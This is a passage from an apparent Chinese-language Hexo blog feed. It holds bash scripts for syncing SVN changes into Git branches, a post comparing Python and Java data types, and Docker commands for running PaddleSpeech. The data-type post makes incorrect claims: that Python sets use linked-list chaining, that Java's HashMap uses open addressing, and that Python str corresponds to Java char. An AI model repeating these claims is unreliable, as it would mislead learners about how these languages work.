    <span class="token function">touch</span> <span class="token variable">$delete_list_file</span>    <span class="token keyword">fi</span>    <span class="token builtin class-name">echo</span> <span class="token string">"添加待删除文件 <span class="token variable">$update_path</span>"</span>    <span class="token builtin class-name">echo</span> <span class="token string">"到 <span class="token variable">$delete_list_file</span>"</span>    <span class="token builtin class-name">echo</span> <span class="token variable">$target_path</span> <span class="token operator">&gt;&gt;</span> <span class="token variable">$delete_list_file</span>  <span class="token keyword">else</span>    <span class="token comment"># echo "文件路径: $file_path"</span>    <span class="token assign-left variable">target_path</span><span class="token operator">=</span><span class="token variable">$branchs_dir</span>/<span class="token variable">$branch</span>/<span class="token variable">$model</span>/<span class="token variable">$file_path</span>    <span class="token comment"># 复制到对应分支目录</span>    <span class="token builtin class-name">echo</span> <span class="token string">"复制文件 <span class="token variable">$update_path</span>"</span>    <span class="token builtin class-name">echo</span> <span class="token string">"到 <span class="token variable">$target_path</span>"</span>    <span class="token assign-left variable">target_dir</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">dirname</span> $target_path<span class="token variable">)</span></span>    <span class="token comment"># 如果目录不存在则创建</span>    <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token operator">!</span> <span class="token parameter variable">-d</span> <span class="token variable">$target_dir</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>      <span class="token builtin class-name">echo</span> <span class="token string">"创建目录: <span class="token variable">$target_dir</span>"</span>      <span class="token function">mkdir</span> <span class="token parameter variable">-p</span> <span class="token variable">$target_dir</span>    <span class="token keyword">fi</span>    <span class="token function">cp</span> <span class="token variable">$update_path</span> <span class="token variable">$target_path</span>  <span class="token keyword">fi</span><span class="token keyword">done</span> <span class="token operator">&lt;</span> <span class="token variable">$update_list_file</span><span class="token comment"># 计算耗时</span><span class="token assign-left variable">end_time</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">date</span> +%s<span class="token variable">)</span></span><span class="token builtin class-name">echo</span> <span class="token string">"拷贝待提交资源耗时: <span class="token variable"><span class="token variable">$((</span>end_time <span class="token operator">-</span> start_time<span class="token variable">))</span></span> 秒"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="提交变更到-Git-仓库"><a href="#提交变更到-Git-仓库" class="headerlink" title="提交变更到 Git 仓库"></a>提交变更到 Git 仓库</h3><p>git_commit_push.sh</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token comment"># sh git_commit_push.sh /f/CodeRepo/Singularity</span><span class="token comment"># 设置git项目目录</span><span class="token assign-left variable">git_project</span><span class="token operator">=</span><span class="token variable">$1</span><span class="token assign-left variable">project_name</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">basename</span> $git_project<span class="token variable">)</span></span><span class="token comment"># 命令行中是否有第三个参数</span><span class="token assign-left variable">dir_struct</span><span class="token operator">=</span>module_branch<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token parameter variable">-n</span> <span class="token string">"<span class="token variable">$2</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token comment"># 有第三个参数，使用第三个参数作为目录结构</span>  <span class="token assign-left variable">dir_struct</span><span class="token operator">=</span><span class="token variable">$2</span>  <span class="token builtin class-name">echo</span> <span class="token string">"目录结构为: <span class="token variable">$dir_struct</span>"</span><span class="token keyword">else</span>  <span class="token builtin class-name">echo</span> <span class="token string">"未指定目录结构，默认为: <span class="token variable">$dir_struct</span>"</span><span class="token keyword">fi</span><span class="token comment"># 分支文件夹</span><span class="token assign-left variable">branchs_dir</span><span class="token operator">=</span><span class="token variable">$git_project</span>/.branches<span class="token builtin class-name">echo</span> <span class="token string">"各分支待提交文件夹: <span class="token variable">$branchs_dir</span>"</span><span class="token builtin class-name">echo</span> <span class="token string">"切换到项目目录: cd <span class="token variable">$git_project</span>"</span><span class="token builtin class-name">cd</span> <span class="token variable">$git_project</span><span class="token assign-left variable">start_time</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">date</span> +%s<span class="token variable">)</span></span><span class="token comment"># 遍历 $branchs_dir 目录下的所有分支</span><span class="token keyword">for</span> <span class="token for-or-select variable">branch</span> <span class="token keyword">in</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">ls</span> $branchs_dir<span class="token variable">)</span></span><span class="token punctuation">;</span> <span class="token keyword">do</span>  <span class="token assign-left variable">git_branch_name</span><span class="token operator">=</span><span class="token variable">$branch</span>  <span class="token builtin class-name">echo</span> <span class="token variable">$git_branch_name</span>  <span class="token comment"># 如果 $branch 不是 dev 则添加前缀 release_</span>  <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">$branch</span> <span class="token operator">!=</span> <span class="token string">"dev"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">$dir_struct</span> <span class="token operator">!=</span> <span class="token string">"stable"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>      <span class="token assign-left variable">git_branch_name</span><span class="token operator">=</span><span class="token string">"release_<span class="token variable">$branch</span>"</span>    <span class="token keyword">fi</span>  <span class="token keyword">fi</span>  <span class="token comment"># 如果分支不存在则跳过</span>  <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token parameter variable">-z</span> <span class="token string">"<span class="token variable"><span class="token variable">$(</span><span class="token function">git</span> branch <span class="token parameter variable">-a</span> <span class="token operator">|</span> <span class="token function">grep</span> $git_branch_name<span class="token variable">)</span></span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token builtin class-name">echo</span> <span class="token string">"跳过不存在的分支: <span class="token variable">$git_branch_name</span>"</span>    <span class="token builtin class-name">continue</span>  <span class="token keyword">fi</span>  <span class="token comment"># 切换到分支并更新</span>  <span class="token function">git</span> checkout <span class="token variable">$git_branch_name</span> <span class="token operator">&amp;&amp;</span> <span class="token function">git</span> pull  <span class="token comment"># 从 main 分支检出 .gitignore 文件</span>  <span class="token function">git</span> checkout main .gitignore  <span class="token function">git</span> checkout main svn_git_map.properties  <span class="token comment"># 如果 .gitignore 有变更则立刻提交并 push</span>  <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token parameter variable">-n</span> <span class="token string">"<span class="token variable"><span class="token variable">$(</span><span class="token function">git</span> status <span class="token parameter variable">--porcelain</span><span class="token variable">)</span></span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token builtin class-name">echo</span> <span class="token string">"更新 .gitignore 文件"</span>    <span class="token function">git</span> <span class="token function">add</span> .gitignore <span class="token operator">&amp;&amp;</span> <span class="token function">git</span> <span class="token function">add</span> svn_git_map.properties <span class="token operator">&amp;&amp;</span> <span class="token function">git</span> commit <span class="token parameter variable">-m</span> <span class="token string">"update .gitignore"</span> <span class="token operator">&amp;&amp;</span> <span class="token function">git</span> push  <span class="token keyword">fi</span>  <span class="token comment"># 如果存在 delete_files.txt 文件, 则删除文件</span>  <span class="token assign-left variable">delete_list_file</span><span class="token operator">=</span><span class="token variable">$branchs_dir</span>/<span class="token variable">$branch</span>/delete_files.txt  <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token parameter variable">-f</span> <span class="token variable">$delete_list_file</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token builtin class-name">echo</span> <span class="token string">"删除文件: xargs rm -rf &lt; <span class="token variable">$delete_list_file</span>"</span>    <span class="token function">xargs</span> <span class="token function">rm</span> <span class="token parameter variable">-rf</span> <span class="token operator">&lt;</span> <span class="token variable">$delete_list_file</span>    <span class="token comment"># 提交并 push</span>    <span class="token function">git</span> <span class="token function">add</span> <span class="token builtin class-name">.</span> <span class="token operator">&amp;&amp;</span> <span class="token function">git</span> commit <span class="token parameter variable">-m</span> <span class="token string">"从 SVN 同步删除文件"</span>    <span class="token comment"># git push</span>  <span class="token keyword">fi</span>  <span class="token comment"># 变更文件目录</span>  <span class="token assign-left variable">update_dir</span><span class="token operator">=</span><span class="token variable">$branchs_dir</span>/<span class="token variable">$branch</span>  <span class="token comment"># 遍历 $update_dir 目录下所有文件夹</span>  <span class="token builtin class-name">echo</span> <span class="token string">"拷贝 <span class="token variable">$update_dir</span> 目录下所有文件夹到 <span class="token variable">$git_project</span> 目录下..."</span>  <span class="token keyword">for</span> <span class="token for-or-select variable">model_dir</span> <span class="token keyword">in</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">ls</span> $update_dir<span class="token variable">)</span></span><span class="token punctuation">;</span> <span class="token keyword">do</span>    <span class="token comment"># 如果是 delete_list_file 则跳过</span>    <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">$model_dir</span> <span class="token operator">==</span> <span class="token string">"delete_files.txt"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>      <span class="token builtin class-name">echo</span> <span class="token string">"跳过文件: <span class="token variable">$update_dir</span>/<span class="token variable">$model_dir</span>"</span>      <span class="token builtin class-name">continue</span>    <span class="token keyword">fi</span>    <span class="token comment"># 如果 model_dir 是目录则跳过</span>    <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token parameter variable">-d</span> <span class="token variable">$update_dir</span>/<span class="token variable">$model_dir</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>      <span class="token comment"># 拷贝文件夹到 $git_project 目录下</span>      <span class="token builtin class-name">echo</span> <span class="token string">"拷贝目录: cp -r <span class="token variable">$update_dir</span>/<span class="token variable">$model_dir</span>/* <span class="token variable">$git_project</span>/<span class="token variable">$model_dir</span>/"</span>      <span class="token function">cp</span> <span class="token parameter variable">-r</span> <span class="token variable">$update_dir</span>/<span class="token variable">$model_dir</span>/* <span class="token variable">$git_project</span>/<span class="token variable">$model_dir</span>/    <span class="token keyword">else</span>      <span class="token comment"># 拷贝文件到 $git_project 目录下</span>      <span class="token builtin class-name">echo</span> <span class="token string">"拷贝文件: cp <span class="token variable">$update_dir</span>/<span class="token variable">$model_dir</span> <span class="token variable">$git_project</span>/<span class="token variable">$model_dir</span>"</span>      <span class="token function">cp</span> <span class="token variable">$update_dir</span>/<span class="token variable">$model_dir</span> <span class="token variable">$git_project</span>/<span class="token variable">$model_dir</span>    <span class="token keyword">fi</span>  <span class="token keyword">done</span>  <span class="token comment"># 提交并 push</span>  <span class="token function">git</span> <span class="token function">add</span> <span class="token builtin class-name">.</span> <span class="token operator">&amp;&amp;</span> <span class="token function">git</span> commit <span class="token parameter variable">-m</span> <span class="token string">"从 SVN <span class="token variable">$branch</span> 分支同步变更"</span>  <span class="token function">git</span> push<span class="token keyword">done</span><span class="token assign-left variable">end_time</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">date</span> +%s<span class="token variable">)</span></span><span class="token builtin class-name">echo</span> <span class="token string">"提交到 Git 耗时: <span class="token variable"><span class="token variable">$((</span>end_time <span class="token operator">-</span> start_time<span class="token variable">))</span></span> 秒"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>类比 Java 学 Python(1)</title>
      <link href="/2023/03/14/learnpythonbyjava-1/"/>
      <url>/2023/03/14/learnpythonbyjava-1/</url>
      
        <content type="html"><![CDATA[<h1 id="Python-基本数据类型"><a href="#Python-基本数据类型" class="headerlink" title="Python 基本数据类型"></a>Python 基本数据类型</h1><h2 id="基本类型"><a href="#基本类型" class="headerlink" title="基本类型"></a>基本类型</h2><p>我们知道 Java 的基本数据类型有 8 种, 分别是 byte、short、int、long、float、double、char 和 boolean</p><p>Python 的基本数据类型也有 8 种, 分别是 int、float、bool、str、list、tuple、set 和 dict</p><p>Python 中的 int、float、bool、str、list、tuple、set 和 dict 分别对应 Java 的 int、float、boolean、char、ArrayList、数组、HashSet 和 HashMap</p><p>其中, 整数、浮点数和布尔值的使用方式与 Java 类似, 而字符串、列表、元组、集合和字典的使用方式也与 Java 类似, 但是有一些细微的差别</p><h3 id="整数-int"><a href="#整数-int" class="headerlink" title="整数(int)"></a>整数(int)</h3><p>整数类型表示整数值, 与 Java 类似。Python 中的整数类型不需要指定大小, 它可以根据所需自动调整大小。例如: </p><pre class="line-numbers language-python" data-language="python"><code class="language-python">a <span class="token operator">=</span> <span class="token number">1</span>b <span class="token operator">=</span> <span class="token number">1000000</span>c <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">500</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="浮点数-float"><a href="#浮点数-float" class="headerlink" title="浮点数(float)"></a>浮点数(float)</h3><p>浮点数类型表示小数值, 与 Java 类似。Python 中的浮点数类型同样可以根据所需自动调整大小。例如: </p><pre class="line-numbers language-python" data-language="python"><code class="language-python">x <span class="token operator">=</span> <span class="token number">3.14</span>y <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">0.001</span>z <span class="token operator">=</span> <span class="token number">1.23e-4</span>  <span class="token comment"># 科学计数法表示的浮点数, 相当于 0.000123</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="布尔值-bool"><a href="#布尔值-bool" class="headerlink" title="布尔值(bool)"></a>布尔值(bool)</h3><p>布尔类型表示真或假两种状态。与 Java 类似, Python 中的布尔类型只有两个值: True 和 False。例如: </p><pre class="line-numbers language-python" data-language="python"><code class="language-python">is_sunny <span class="token operator">=</span> <span class="token boolean">True</span>is_raining <span class="token operator">=</span> <span class="token boolean">False</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="字符串-str"><a href="#字符串-str" class="headerlink" title="字符串(str)"></a>字符串(str)</h3><p>字符串类型表示一串字符, 可以用单引号、双引号或三引号表示。与 Java 不同的是, Python 中的字符串是不可变类型, 也就是说, 一旦创建就不能修改。例如: </p><pre class="line-numbers language-python" data-language="python"><code class="language-python">s1 <span class="token operator">=</span> <span class="token string">'hello'</span>s2 <span class="token operator">=</span> <span class="token string">"world"</span>s3 <span class="token operator">=</span> <span class="token triple-quoted-string string">'''Hello, world!'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>和 Java 中的字符串类似, 都是一种不可变序列, 表示由一系列 Unicode 字符组成的字符序列, 用来存储文本类型的数据。</p><p>Python 中的字符串底层实现是通过一个字符数组来实现的, 也就是说, Python 中的字符串实际上是一个字符数组对象。当需要修改字符串时, Python 会创建一个新的字符串对象, 而不是在原有的字符串对象上直接修改。</p><p>Python 中的字符串采用了引用计数(reference counting)和垃圾回收(garbage collection)的机制来管理内存。每个字符串对象都有一个引用计数器, 当一个对象被引用时, 它的引用计数会加 1, 当一个对象的引用被删除时, 它的引用计数会减 1, 当引用计数为 0 时, 对象被认为是不再被引用, Python 的垃圾回收机制会回收该对象的内存空间。</p><p>Java 中的字符串是一个对象类型, 它底层实现是通过一个字符数组和一个偏移量和长度来表示的。当需要修改字符串时, Java 会创建一个新的字符串对象, 而不是在原有的字符串对象上直接修改。Java 中的字符串常量池(String Pool)可以重用相同的字符串对象, 避免了创建大量相同字符串对象的开销。</p><p>另一个不同之处在于, Python 中的字符串可以使用单引号、双引号或三引号表示, 而 Java 中的字符串只能使用双引号表示。</p><h3 id="列表-list"><a href="#列表-list" class="headerlink" title="列表(list)"></a>列表(list)</h3><p>列表是一种有序的可变序列, 可以存储任意类型的元素。列表使用方括号 [] 来表示, 各个元素之间用逗号隔开。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span>b <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'hello'</span><span class="token punctuation">,</span> <span class="token string">'world'</span><span class="token punctuation">]</span>c <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'hello'</span><span class="token punctuation">,</span> <span class="token number">3.14</span><span class="token punctuation">]</span>lst <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'hello'</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>和 Java 中的 ArrayList 类似, 都是一种有序的可变序列。不同之处在于, Python 中的列表可以存储任意类型的元素, 而 Java 中的 ArrayList 只能存储对象类型。</p><p>此外, Python 中的列表使用方括号 [] 表示, 而 Java 中的 ArrayList 需要通过 <code>import java.util.ArrayList;</code> 来导入, 使用时需要先创建对象再添加元素。</p><p>它的底层实现是基于动态数组和可扩展数组的, Python 中的列表可以动态地增加或缩减大小, 这是因为列表中的元素实际上是存储在一个动态分配的数组中的。</p><p>在 Python 中, 列表的底层实现使用了一个数组缓冲区(array buffer), 用于存储列表中的元素。当列表的大小增加时, Python 会为数组缓冲区分配更大的内存空间, 将现有的元素复制到新的缓冲区中, 然后释放旧的缓冲区。这种方法可以有效地减少内存分配和复制的次数, 提高程序的效率。</p><p>与 Java 语言的 ArrayList 不同之处在于, Java 中的 ArrayList 使用了连续的存储空间(连续的内存地址), 并且在容量不足时需要重新分配内存空间, 将现有的元素复制到新的内存空间中, 这样就可能导致内存分配和复制的次数增加, 影响程序的性能。</p><p>因此, 在处理大量数据时, Python 中的列表可能会更加高效。</p><p>但是, 由于 Python 中的列表可以存储任意类型的元素, 因此在处理相同类型的元素时, Java 中的 ArrayList 可能会更加高效。</p><h3 id="元组-tuple"><a href="#元组-tuple" class="headerlink" title="元组(tuple)"></a>元组(tuple)</h3><p>元组是一种有序的不可变序列, 也可以存储任意类型的元素。元组使用圆括号 () 来表示, 各个元素之间用逗号隔开。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">a <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span>b <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'hello'</span><span class="token punctuation">,</span> <span class="token string">'world'</span><span class="token punctuation">)</span>c <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'hello'</span><span class="token punctuation">,</span> <span class="token number">3.14</span><span class="token punctuation">)</span>tup <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'hello'</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>和 Java 中的数组有些相似, 都是一种有序的不可变序列。但元组的长度和元素内容不能被修改。元组通常用于存储不同类型的数据, 例如多个返回值的函数结果, 或者将多个元素作为一个整体进行传递。</p><p>元组底层实现是基于数组的, 与列表类似, 但是由于元组是不可变的, 因此在创建时会分配一个固定的内存空间来存储元素, 这个空间在后续的使用中不会被改变。因为元组是不可变的, 所以它们可以被用作字典的键, 而列表则不能。</p><p>与 Java 语言的数组不同之处在于, Python 中的元组可以存储任意类型的元素, 而 Java 中的数组虽然也是固定大小的, 但它们是可变的, 可以通过下标来修改元素内容。</p><p>此外, Python 中的元组使用圆括号 () 表示, 而 Java 中的数组需要使用方括号 [] 来声明。</p><h3 id="集合-set"><a href="#集合-set" class="headerlink" title="集合(set)"></a>集合(set)</h3><p>和 Java 中的 HashSet 类似, 都是一种无序的可变集合, 不允许出现重复元素。集合使用花括号 {} 或 set() 函数来创建, 各个元素之间用逗号隔开。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">s1 <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">}</span>s2 <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">)</span>s3 <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token string">'hello'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>Python 中的集合底层实现是基于哈希表的, 它可以实现常数时间(O(1))的插入、删除和查找操作。</p><p>在 Python 中, 哈希表是通过一个数组来实现的, 每个数组元素都是一个指向链表的指针, 每个链表节点存储一个键值对。当需要插入一个元素时, Python 会根据元素的哈希值(hash value)来计算出在数组中的位置, 然后将元素插入到对应的链表中。当需要查找一个元素时, Python 也会根据元素的哈希值来计算出在数组中的位置, 然后遍历对应的链表查找元素。当需要删除一个元素时, Python 会根据元素的哈希值来计算出在数组中的位置, 然后在对应的链表中删除元素。</p><p>与 Java 语言的 HashSet 不同之处在于, Java 中的 HashSet 也是基于哈希表实现的, 但是它使用的是数组加链表或红黑树的方式来实现, 而 Python 中的集合只使用了链表, 这也意味着 Python 中的集合在存储大量元素时, 可能会受到哈希冲突(hash collision)的影响, 导致链表长度增加, 进而影响程序的性能。另外, Python 中的集合可以存储任意类型的元素, 而 Java 中的 HashSet 只能存储对象类型的元素。</p><p>此外, Python 中的集合使用花括号 {} 或 set() 函数来创建, 而 Java 中的 HashSet 需要通过 <code>import java.util.HashSet;</code> 来导入, 使用时需要先创建对象再添加元素。</p><h3 id="字典-dict"><a href="#字典-dict" class="headerlink" title="字典(dict)"></a>字典(dict)</h3><p>和 Java 中的 HashMap 类似, 都是一种无序的键值对(key-value)集合, 每个键都必须是唯一的, 键和值可以是任意类型的元素。字典使用花括号 {} 来表示, 键和值之间用冒号 : 隔开, 各个键值对之间用逗号隔开。例如: </p><pre class="line-numbers language-python" data-language="python"><code class="language-python">dic <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'Alice'</span><span class="token punctuation">,</span> <span class="token string">'age'</span><span class="token punctuation">:</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token string">'gender'</span><span class="token punctuation">:</span> <span class="token string">'female'</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>字典的底层实现是通过哈希表(hash table)来实现的。哈希表是一种基于数组实现的数据结构, 它通过将键映射到数组中的一个位置来实现快速的键值查找。Python 中的字典底层实现中使用了一些哈希表优化技术, 例如使用开放地址法(open addressing)解决哈希冲突、缩小哈希表的负载因子(load factor)等等。</p><p>与 Python 不同, Java 中的字典(Map)是一个接口类型, 它有多种实现方式, 例如 HashMap、TreeMap、LinkedHashMap 等等。其中, HashMap 是最常用的一种实现方式, 它也是基于哈希表实现的。Java 中的哈希表同样使用了开放地址法解决哈希冲突, 并且也有一些优化技术, 例如链式哈希表(chained hash table)和重新哈希(rehashing)等等。</p><p>Python 中的字典可以存储任意类型的键和值, 而 Java 中的 HashMap 只能存储对象类型的键和值。</p><p>此外, Python 中的字典使用花括号 {} 表示, 而 Java 中的 HashMap 需要通过 <code>import java.util.HashMap;</code> 来导入, 使用时需要先创建对象再添加键值对。</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows Docker 中运行 PaddleSpeech</title>
      <link href="/2023/01/22/paddlespeechinwindowsdocker/"/>
      <url>/2023/01/22/paddlespeechinwindowsdocker/</url>
      
        <content type="html"><![CDATA[<h2 id="PaddleSpeech"><a href="#PaddleSpeech" class="headerlink" title="PaddleSpeech"></a>PaddleSpeech</h2><p><a href="https://github.com/PaddlePaddle/PaddleSpeech/blob/develop/README_cn.md#%E5%BF%AB%E9%80%9F%E5%BC%80%E5%A7%8B">语音识别、语音合成等示例</a></p><h3 id="创建容器"><a href="#创建容器" class="headerlink" title="创建容器"></a>创建容器</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># docker build -f Dockerfile -t crazybun/ruoyi:20221223 . &amp;&amp; docker run --name ruoyi -d -t -i -v /root/logs/docker-logs/ruoyi:/RuoYi/logs -p 80:80 --restart always crazybun/ruoyi:20221223 </span><span class="token function">docker</span> run <span class="token parameter variable">--name</span> paddlespeech-cpu <span class="token parameter variable">-itd</span> <span class="token parameter variable">-p</span> <span class="token number">8888</span>:8888 <span class="token punctuation">\</span>  <span class="token parameter variable">-v</span> /g/Docker/volumes/paddlespeech/mnt:/mnt <span class="token punctuation">\</span>  <span class="token parameter variable">-v</span> /d/TensorFlowNotebook:/root/notebook <span class="token punctuation">\</span>  <span class="token parameter variable">-v</span> /g/Docker/volumes/paddlespeech_gpu/.jupyter:/root/.jupyter <span class="token punctuation">\</span>  paddlecloud/paddlespeech:develop-cpu-478fd2  /bin/bash<span class="token comment"># 先执行下面命令将 /root 目录备份出来</span><span class="token comment"># docker run --name paddlespeech-gpu -itd -p 8888:8888 -p 8090:8090 --restart always --gpus all -v /h/MyPrograms/Python/PaddleSpeech:/home/PaddleSpeech -v /g/Docker/volumes/paddlespeech_gpu/mnt:/mnt -v /d/TensorFlowNotebook:/notebook -v /g/Docker/volumes/paddlespeech_gpu/.jupyter:/root/.jupyter paddlecloud/paddlespeech:develop-gpu-cuda11.2-cudnn8-478fd2 /bin/bash</span><span class="token function">docker</span> run <span class="token parameter variable">--name</span> paddlespeech-gpu <span class="token parameter variable">-itd</span> <span class="token parameter variable">-p</span> <span class="token number">8888</span>:8888 <span class="token parameter variable">-p</span> <span class="token number">8090</span>:8090 <span class="token parameter variable">--restart</span> always <span class="token parameter variable">--gpus</span> all <span class="token parameter variable">--ipc</span><span class="token operator">=</span>host <span class="token parameter variable">-v</span> /h/MyPrograms/Python/PaddleSpeech:/home/PaddleSpeech <span class="token parameter variable">-v</span> /g/Docker/volumes/paddlespeech_gpu/mnt:/mnt <span class="token parameter variable">-v</span> /g/Docker/volumes/paddlespeech_gpu/root:/root <span class="token parameter variable">-v</span> /d/TensorFlowNotebook:/notebook <span class="token parameter variable">-v</span> /g/Docker/volumes/paddlespeech_gpu/.jupyter:/root/.jupyter paddlecloud/paddlespeech:develop-gpu-cuda11.2-cudnn8-478fd2 /bin/bash<span class="token function">docker</span> run <span class="token parameter variable">--name</span> paddlespeech <span class="token parameter variable">-itd</span> <span class="token parameter variable">-p</span> <span class="token number">8888</span>:8888 <span class="token parameter variable">-p</span> <span class="token number">8090</span>:8090 <span class="token parameter variable">--restart</span> always <span class="token parameter variable">--gpus</span> all <span class="token parameter variable">--ipc</span><span class="token operator">=</span>host <span class="token parameter variable">-v</span> 